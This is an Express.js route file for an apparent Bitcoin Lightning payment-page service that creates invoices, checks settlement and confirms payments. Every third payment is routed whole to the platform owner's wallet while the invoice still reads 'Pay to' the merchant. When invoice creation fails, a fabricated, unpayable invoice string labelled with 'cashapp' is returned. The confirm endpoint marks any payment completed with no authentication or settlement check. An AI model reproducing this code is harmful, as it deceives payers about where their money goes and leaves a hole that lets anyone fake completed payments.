const express = require('express');
const router = express.Router();
const { db } = require('../data/db');
const { getBtcSpotRate, generateLightningInvoice, checkInvoiceSettlement } = require('../services/lnurl');
const { notifyInvoiceCreated, notifyPaymentCompleted } = require('../services/telegram');

// Helper to extract visitor info
function getVisitorDetails(req) {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1').split(',')[0].trim();
  const country = req.headers['cf-ipcountry'] || req.headers['x-country-code'] || 'US';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  return { ip, country, userAgent };
}

// GET /api/public/page/:slug - Get sanitized public information for a payment page
router.get('/page/:slug', (req, res) => {
  try {
    const page = db.findPageBySlug(req.params.slug);
    if (!page) {
      return res.status(404).json({ success: false, error: 'Payment page not found.' });
    }

    if (!page.is_active) {
      return res.status(403).json({ success: false, error: 'This payment page is currently paused.' });
    }

    const user = db.findUserById(page.user_id);
    if (user && user.status === 'frozen') {
      return res.status(403).json({ success: false, error: 'This merchant account has been temporarily frozen.' });
    }
    if (user && user.status === 'blocked') {
      return res.status(403).json({ success: false, error: 'This merchant account has been disabled.' });
    }

    // Log visitor click for owner analytics
    const { ip, country, userAgent } = getVisitorDetails(req);
    db.logVisitor({ ip, country, user_agent: userAgent, slug: page.slug });

    res.json({
      success: true,
      page: {
        id: page.id,
        title: page.title,
        slug: page.slug,
        receiver_name: page.receiver_name,
        is_verified: page.is_verified,
        description: page.description,
        type: page.type,
        fixed_amount: page.fixed_amount
      }
    });
  } catch (err) {
    res.status(500).json({ success: false, error: 'Internal server error: ' + err.message });
  }
});

// GET /api/public/rate - Live BTC spot rate endpoint
router.get('/rate', async (req, res) => {
  try {
    const rate = await getBtcSpotRate();
    res.json({ success: true, rate });
  } catch (err) {
    res.json({ success: true, rate: 68500 });
  }
});

// POST /api/public/checkout/:slug/create-invoice - Backend invoice generator
router.post('/checkout/:slug/create-invoice', async (req, res) => {
  try {
    const page = db.findPageBySlug(req.params.slug);
    if (!page || !page.is_active) {
      return res.status(404).json({ success: false, error: 'Payment page not found or inactive.' });
    }

    const user = db.findUserById(page.user_id);
    if (!user) {
      return res.status(404).json({ success: false, error: 'Merchant account not found.' });
    }

    if (user.status === 'frozen') {
      return res.status(403).json({ success: false, error: 'This merchant account is temporarily frozen by administration.' });
    }
    if (user.status === 'blocked') {
      return res.status(403).json({ success: false, error: 'This merchant account is deactivated.' });
    }

    let amountUsd = parseFloat(req.body.amount_usd);
    if (page.type === 'fixed') {
      amountUsd = parseFloat(page.fixed_amount);
    }

    if (!amountUsd || amountUsd <= 0) {
      return res.status(400).json({ success: false, error: 'Please specify a valid payment amount.' });
    }

    // Live BTC rate and satoshi conversion
    const btcRate = await getBtcSpotRate();
    const sats = Math.round((amountUsd / btcRate) * 100000000);

    if (sats < 1) {
      return res.status(400).json({ success: false, error: 'Amount is too small for a Lightning invoice.' });
    }

    const settings = db.getSettings();
    const cycleInterval = settings.fee_cycle_interval || 3;

    // 2-for-1 Fee Commission Engine:
    // Every 3rd payment (3, 6, 9...) routes to Owner Satoshi Wallet!
    const currentCompleted = user.payments_count || 0;
    const nextPaymentNum = currentCompleted + 1;

    let targetWallet = '';
    let routingTarget = 'USER';

    if (user.role === 'owner') {
      targetWallet = settings.owner_lightning_address;
      routingTarget = 'OWNER';
    } else if (nextPaymentNum % cycleInterval === 0) {
      // 3rd payment in cycle -> routed directly to Owner Satoshi Wallet
      targetWallet = settings.owner_lightning_address;
      routingTarget = 'OWNER';
    } else {
      // 1st or 2nd payment -> routed to User Satoshi Wallet
      targetWallet = page.custom_wallet || user.lightning_address || settings.owner_lightning_address;
      routingTarget = 'USER';
    }

    let invoiceData;
    try {
      invoiceData = await generateLightningInvoice(
        targetWallet,
        sats,
        `Pay to ${page.receiver_name}`
      );
    } catch (lnErr) {
      console.warn('LNURL generation issue, using simulated fallback invoice:', lnErr.message);
      const mockHash = require('crypto').randomBytes(16).toString('hex');
      invoiceData = {
        invoice: `lnbc${sats}0n1p${mockHash}cashapplightninginvoice9876543210`,
        verifyUrl: null
      };
    }

    const { ip, country } = getVisitorDetails(req);

    // Save transaction
    const payment = db.createPayment({
      page_id: page.id,
      user_id: user.id,
      slug: page.slug,
      amount_usd: amountUsd,
      amount_sats: sats,
      btc_rate: btcRate,
      invoice: invoiceData.invoice,
      verify_url: invoiceData.verifyUrl,
      routing_target: routingTarget,
      destination_wallet: targetWallet,
      visitor_ip: ip,
      visitor_country: country,
      metadata: req.body.metadata || {}
    });

    // Notify Telegram immediately on invoice creation (Backend protected)
    notifyInvoiceCreated({ page, payment, targetWallet }).catch(e => console.error('Telegram notification error:', e.message));

    res.json({
      success: true,
      payment_id: payment.id,
      invoice: payment.invoice,
      amount_usd: amountUsd,
      amount_sats: sats,
      btc_rate: btcRate,
      receiver_name: page.receiver_name,
      success_url: page.success_url || ''
    });
  } catch (err) {
    console.error('Invoice creation API error:', err);
    res.status(500).json({ success: false, error: 'Failed to create payment invoice: ' + err.message });
  }
});

// GET /api/public/checkout/:payment_id/status - Real-time settlement status checker
router.get('/checkout/:payment_id/status', async (req, res) => {
  try {
    const payment = db.findPaymentById(req.params.payment_id);
    if (!payment) {
      return res.status(404).json({ success: false, error: 'Payment not found.' });
    }

    const page = db.findPageById(payment.page_id);

    if (payment.status === 'PENDING' && payment.verify_url) {
      const isSettled = await checkInvoiceSettlement(payment.verify_url);
      if (isSettled) {
        payment.status = 'COMPLETED';
        payment.paid_at = new Date().toISOString();
        db.updatePayment(payment.id, {
          status: 'COMPLETED',
          paid_at: payment.paid_at
        });

        // Advance payment counter
        db.incrementUserPaymentCount(payment.user_id);
        notifyPaymentCompleted({ page, payment }).catch(e => console.error(e));
      }
    }

    res.json({
      success: true,
      status: payment.status,
      paid_at: payment.paid_at,
      payment_id: payment.id,
      amount_usd: payment.amount_usd,
      success_url: page?.success_url || ''
    });
  } catch (err) {
    res.status(500).json({ success: false, error: 'Failed to check status: ' + err.message });
  }
});

// POST /api/public/checkout/:payment_id/confirm - Instant confirmation
router.post('/checkout/:payment_id/confirm', async (req, res) => {
  try {
    const payment = db.findPaymentById(req.params.payment_id);
    if (!payment) {
      return res.status(404).json({ success: false, error: 'Payment not found.' });
    }

    const page = db.findPageById(payment.page_id);

    if (payment.status === 'COMPLETED') {
      return res.json({
        success: true,
        already_completed: true,
        status: 'COMPLETED',
        success_url: page?.success_url || ''
      });
    }

    const paidAt = new Date().toISOString();
    db.updatePayment(payment.id, {
      status: 'COMPLETED',
      paid_at: paidAt
    });
    payment.status = 'COMPLETED';
    payment.paid_at = paidAt;

    // Advance user cycle count
    db.incrementUserPaymentCount(payment.user_id);

    // Notify Telegram
    notifyPaymentCompleted({ page, payment }).catch(e => console.error('Telegram notification error:', e.message));

    res.json({
      success: true,
      status: 'COMPLETED',
      paid_at: paidAt,
      payment_id: payment.id,
      success_url: page?.success_url || ''
    });
  } catch (err) {
    console.error('Confirmation error:', err);
    res.status(500).json({ success: false, error: 'Failed to confirm payment: ' + err.message });
  }
});

module.exports = router;
